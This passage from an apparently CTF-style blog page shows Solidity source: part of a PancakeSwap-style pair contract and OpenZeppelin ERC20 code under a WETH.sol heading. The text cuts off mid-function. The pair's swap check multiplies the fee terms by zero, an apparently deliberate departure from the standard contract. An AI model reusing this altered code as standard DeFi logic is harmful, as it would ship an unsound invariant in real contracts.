+= uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;</span><br><span class="line">        &#125;</span><br><span class="line">        reserve0 = uint112(balance0);</span><br><span class="line">        reserve1 = uint112(balance1);</span><br><span class="line">        blockTimestampLast = blockTimestamp;</span><br><span class="line">        emit Sync(reserve0, reserve1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // this low-level function should be called from a contract which performs important safety checks</span><br><span class="line">    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock &#123;</span><br><span class="line">        require(amount0Out &gt; 0 || amount1Out &gt; 0, &#x27;Pancake: INSUFFICIENT_OUTPUT_AMOUNT&#x27;);</span><br><span class="line">        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings</span><br><span class="line">        require(amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1, &#x27;Pancake: INSUFFICIENT_LIQUIDITY&#x27;);</span><br><span class="line"></span><br><span class="line">        uint balance0;</span><br><span class="line">        uint balance1;</span><br><span class="line">        &#123; // scope for _token&#123;0,1&#125;, avoids stack too deep errors</span><br><span class="line">        address _token0 = token0;</span><br><span class="line">        address _token1 = token1;</span><br><span class="line">        require(to != _token0 &amp;&amp; to != _token1, &#x27;Pancake: INVALID_TO&#x27;);</span><br><span class="line">        if (amount0Out &gt; 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens</span><br><span class="line">        if (amount1Out &gt; 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens</span><br><span class="line">        if (data.length &gt; 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);</span><br><span class="line">        balance0 = IERC20(_token0).balanceOf(address(this));</span><br><span class="line">        balance1 = IERC20(_token1).balanceOf(address(this));</span><br><span class="line">        &#125;</span><br><span class="line">        uint amount0In = balance0 &gt; _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;</span><br><span class="line">        uint amount1In = balance1 &gt; _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;</span><br><span class="line">        require(amount0In &gt; 0 || amount1In &gt; 0, &#x27;Pancake: INSUFFICIENT_INPUT_AMOUNT&#x27;);</span><br><span class="line">        &#123; // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors</span><br><span class="line">        uint balance0Adjusted = (balance0.mul(10000).sub(amount0In.mul(0)));</span><br><span class="line">        uint balance1Adjusted = (balance1.mul(10000).sub(amount1In.mul(0)));</span><br><span class="line">        require(balance0Adjusted.mul(balance1Adjusted) &gt;= uint(_reserve0).mul(_reserve1).mul(10000**2), &#x27;Pancake: K&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _update(balance0, balance1, _reserve0, _reserve1);</span><br><span class="line">        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // force balances to match reserves</span><br><span class="line">    function skim(address to) external lock &#123;</span><br><span class="line">        address _token0 = token0; // gas savings</span><br><span class="line">        address _token1 = token1; // gas savings</span><br><span class="line">        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));</span><br><span class="line">        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // force reserves to match balances</span><br><span class="line">    function sync() external lock &#123;</span><br><span class="line">        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="WETH-sol"><a href="#WETH-sol" class="headerlink" title="WETH.sol"></a>WETH.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// File: @openzeppelin/contracts/utils/Context.sol</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./Interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Provides information about the current execution context, including the</span><br><span class="line"> * sender of the transaction and its data. While these are generally available</span><br><span class="line"> * via msg.sender and msg.data, they should not be accessed in such a direct</span><br><span class="line"> * manner, since when dealing with meta-transactions the account sending and</span><br><span class="line"> * paying for execution may not be the actual sender (as far as an application</span><br><span class="line"> * is concerned).</span><br><span class="line"> *</span><br><span class="line"> * This contract is only required for intermediate, library-like contracts.</span><br><span class="line"> */</span><br><span class="line">abstract contract Context &#123;</span><br><span class="line">    function _msgSender() internal view virtual returns (address) &#123;</span><br><span class="line">        return msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _msgData() internal view virtual returns (bytes calldata) &#123;</span><br><span class="line">        return msg.data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Interface for the optional metadata functions from the ERC20 standard.</span><br><span class="line"> *</span><br><span class="line"> * _Available since v4.1._</span><br><span class="line"> */</span><br><span class="line">interface IERC20Metadata is IERC20 &#123;</span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the name of the token.</span><br><span class="line">     */</span><br><span class="line">    function name() external view returns (string memory);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the symbol of the token.</span><br><span class="line">     */</span><br><span class="line">    function symbol() external view returns (string memory);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the decimals places of the token.</span><br><span class="line">     */</span><br><span class="line">    function decimals() external view returns (uint8);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// File: @openzeppelin/contracts/token/ERC20/ERC20.sol</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/ERC20.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Implementation of the &#123;IERC20&#125; interface.</span><br><span class="line"> *</span><br><span class="line"> * This implementation is agnostic to the way tokens are created. This means</span><br><span class="line"> * that a supply mechanism has to be added in a derived contract using &#123;_mint&#125;.</span><br><span class="line"> * For a generic mechanism see &#123;ERC20PresetMinterPauser&#125;.</span><br><span class="line"> *</span><br><span class="line"> * TIP: For a detailed writeup see our guide</span><br><span class="line"> * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How</span><br><span class="line"> * to implement supply mechanisms].</span><br><span class="line"> *</span><br><span class="line"> * The default value of &#123;decimals&#125; is 18. To change this, you should override</span><br><span class="line"> * this function so it returns a different value.</span><br><span class="line"> *</span><br><span class="line"> * We have followed general OpenZeppelin Contracts guidelines: functions revert</span><br><span class="line"> * instead returning `false` on failure. This behavior is nonetheless</span><br><span class="line"> * conventional and does not conflict with the expectations of ERC20</span><br><span class="line"> * applications.</span><br><span class="line"> *</span><br><span class="line"> * Additionally, an &#123;Approval&#125; event is emitted on calls to &#123;transferFrom&#125;.</span><br><span class="line"> * This allows applications to reconstruct the allowance for all accounts just</span><br><span class="line"> * by listening to said events. Other implementations of the EIP may not emit</span><br><span class="line"> * these events, as it isn&#x27;t required by the specification.</span><br><span class="line"> *</span><br><span class="line"> * Finally, the non-standard &#123;decreaseAllowance&#125; and &#123;increaseAllowance&#125;</span><br><span class="line"> * functions have been added to mitigate the well-known issues around setting</span><br><span class="line"> * allowances. See &#123;IERC20-approve&#125;.</span><br><span class="line"> */</span><br><span class="line">contract ERC20 is Context, IERC20, IERC20Metadata &#123;</span><br><span class="line">    mapping(address =&gt; uint256) private _balances;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">    uint256 private _totalSupply;</span><br><span class="line"></span><br><span class="line">    string private _name;</span><br><span class="line">    string private _symbol;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Sets the values for &#123;name&#125; and &#123;symbol&#125;.</span><br><span class="line">     *</span><br><span class="line">     * All two of these values are immutable: they can only be set once during</span><br><span class="line">     * construction.</span><br><span class="line">     */</span><br><span class="line">    constructor(string memory name_, string memory symbol_) &#123;</span><br><span class="line">        _name = name_;</span><br><span class="line">        _symbol = symbol_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the name of the token.</span><br><span class="line">     */</span><br><span class="line">    function name() public view virtual override returns (string memory) &#123;</span><br><span class="line">        return _name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the symbol of the token, usually a shorter version of the</span><br><span class="line">     * name.</span><br><span class="line">     */</span><br><span class="line">    function symbol() public view virtual override returns (string memory) &#123;</span><br><span class="line">        return _symbol;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the number of decimals used to get its user representation.</span><br><span class="line">     * For example, if `decimals` equals `2`, a balance of `505` tokens should</span><br><span class="line">     * be displayed to a user as `5.05` (`505 / 10 ** 2`).</span><br><span class="line">     *</span><br><span class="line">     * Tokens usually opt for a value of 18, imitating the relationship between</span><br><span class="line">     * Ether and Wei. This is the default value returned by this function, unless</span><br><span class="line">     * it&#x27;s overridden.</span><br><span class="line">     *</span><br><span class="line">     * NOTE: This information is only used for _display_ purposes: it in</span><br><span class="line">     * no way affects any of the arithmetic of the contract, including</span><br><span class="line">     * &#123;IERC20-balanceOf&#125; and &#123;IERC20-transfer&#125;.</span><br><span class="line">     */</span><br><span class="line">    function decimals() public view virtual override returns (uint8) &#123;</span><br><span class="line">        return 18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev See &#123;IERC20-totalSupply&#125;.</span><br><span class="line">     */</span><br><span class="line">    function totalSupply() public view virtual override returns (uint256) &#123;</span><br><span class="line">        return _totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev See &#123;IERC20-balanceOf&#125;.</span><br><span class="line">     */</span><br><span class="line">    function balanceOf(address account) public view virtual override returns (uint256) &#123;</span><br><span class="line">        return _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev See &#123;IERC20-transfer&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `to` cannot be the zero address.</span><br><span class="line">     * - the caller must have a balance of at least `amount`.</span><br><span class="line">     */</span><br><span class="line">    function transfer(address to, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address owner = _msgSender();</span><br><span class="line">        _transfer(owner, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev See &#123;IERC20-allowance&#125;.</span><br><span class="line">     */</span><br><span class="line">    function allowance(address owner, address spender) public view virtual override returns (uint256) &#123;</span><br><span class="line">        return _allowances[owner][spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev See &#123;IERC20-approve&#125;.</span><br><span class="line">     *</span><br><span class="line">     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on</span><br><span class="line">     * `transferFrom`. This is semantically equivalent to an infinite approval.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `spender` cannot be the zero address.</span><br><span class="line">     */</span><br><span class="line">    function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address owner = _msgSender();</span><br><span class="line">        _approve(owner, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev See &#123;IERC20-transferFrom&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;Approval&#125; event indicating the updated allowance. This is not</span><br><span class="line">     * required by the EIP. See the note at the beginning of &#123;ERC20&#125;.</span><br><span class="line">     *</span><br><span class="line">     * NOTE: Does not update the allowance if the current allowance</span><br><span class="line">     * is the maximum `uint256`.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `from` and `to` cannot be the zero address.</span><br><span class="line">     * - `from` must have a balance of at least `amount`.</span><br><span class="line">     * - the caller must have allowance for ``from``&#x27;s tokens of at least</span><br><span class="line">     * `amount`.</span><br><span class="line">     */</span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address spender = _msgSender();</span><br><span class="line">        _spendAllowance(from, spender, amount);</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Atomically increases the allowance granted to `spender` by the caller.</span><br><span class="line">     *</span><br><span class="line">     * This is an alternative to &#123;approve&#125; that can be used as a mitigation for</span><br><span class="line">     * problems described in &#123;IERC20-approve&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;Approval&#125; event indicating the updated allowance.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `spender` cannot be the zero address.</span><br><span class="line">     */</span><br><span class="line">    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) &#123;</span><br><span class="line">        address owner = _msgSender();</span><br><span class="line">        _approve(owner, spender, allowance(owner, spender) + addedValue);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Atomically decreases the allowance granted to `spender` by the caller.</span><br><span class="line">     *</span><br><span class="line">     * This is an alternative to &#123;approve&#125; that can be used as a mitigation for</span><br><span class="line">     * problems described in &#123;IERC20-approve&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;Approval&#125; event indicating the updated allowance.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `spender` cannot be the zero address.</span><br><span class="line">     * - `spender` must have allowance for the caller of at least</span><br><span class="line">     * `subtractedValue`.</span><br><span class="line">     */</span><br><span class="line">    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) &#123;</span><br><span class="line">        address owner = _msgSender();</span><br><span class="line">        uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">        require(currentAllowance &gt;= subtractedValue, &quot;ERC20: decreased allowance below zero&quot;);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _approve(owner, spender, currentAllowance - subtractedValue);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Moves `amount` of tokens from `from` to `to`.</span><br><span class="line">     *</span><br><span class="line">     * This internal function is equivalent to &#123;transfer&#125;, and can be used to</span><br><span class="line">     * e.g. implement automatic token fees, slashing mechanisms, etc.</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;Transfer&#125; event.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `from` cannot be the zero address.</span><br><span class="line">     * - `to` cannot be the zero address.</span><br><span class="line">     * - `from` must have a balance of at least `amount`.</span><br><span class="line">     */</span><br><span class="line">    function _transfer(address from, address to, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(from != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">        require(to != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(from, to, amount);</span><br><span class="line"></span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        require(fromBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[from] = fromBalance - amount;</span><br><span class="line">            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by</span><br><span class="line">            // decrementing then incrementing.</span><br><span class="line">            _balances[to] += amount;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit Transfer(from, to, amount);</span><br><span class="line"></span><br><span class="line">        _afterTokenTransfer(from, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /** @dev Creates `amount` tokens and assigns them to `account`, increasing</span><br><span class="line">     * the total supply.</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;Transfer&#125; event with `from` set to the zero address.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `account` cannot be the zero address.</span><br><span class="line">     */</span><br><span class="line">    function _mint(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: mint to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(address(0), account, amount);</span><br><span class="line"></span><br><span class="line">        _totalSupply += amount;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.</span><br><span class="line">            _balances[account] += amount;</span><br><span class="line">        &#125;</span><br><span class="line">        emit Transfer(address(0), account, amount);</span><br><span class="line"></span><br><span class="line">        _afterTokenTransfer(address(0), account, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Destroys `amount` tokens from `account`, reducing the</span><br><span class="line">     * total supply.</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;Transfer&#125; event with `to` set to the zero address.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `account` cannot be the zero address.</span><br><span class="line">     * - `account` must have at least `amount` tokens.</span><br><span class="line">     */</span><br><span class="line">    function _burn(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: burn from the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(account, address(0), amount);</span><br><span class="line"></span><br><span class="line">        uint256 accountBalance = _balances[account];</span><br><span class="line">        require(accountBalance &gt;= amount, &quot;ERC20: burn amount exceeds balance&quot;);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[account] = accountBalance - amount;</span><br><span class="line">            // Overflow not possible: amount &lt;= accountBalance &lt;= totalSupply.</span><br><span class="line">            _totalSupply -= amount;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit Transfer(account, address(0), amount);</span><br><span class="line"></span><br><span class="line">        _afterTokenTransfer(account, address(0), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.</span><br><span class="line">     *</span><br><span class="line">     * This internal function is equivalent to `approve`, and can be used to</span><br><span class="line">     * e.g. set automatic allowances for certain subsystems, etc.</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;Approval&#125; event.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - `owner` cannot be the zero address.</span><br><span class="line">     * - `spender` cannot be the zero address.</span><br><span class="line">     */</span><br><span class="line">    function _approve(address owner, address spender, uint256 amount) internal virtual 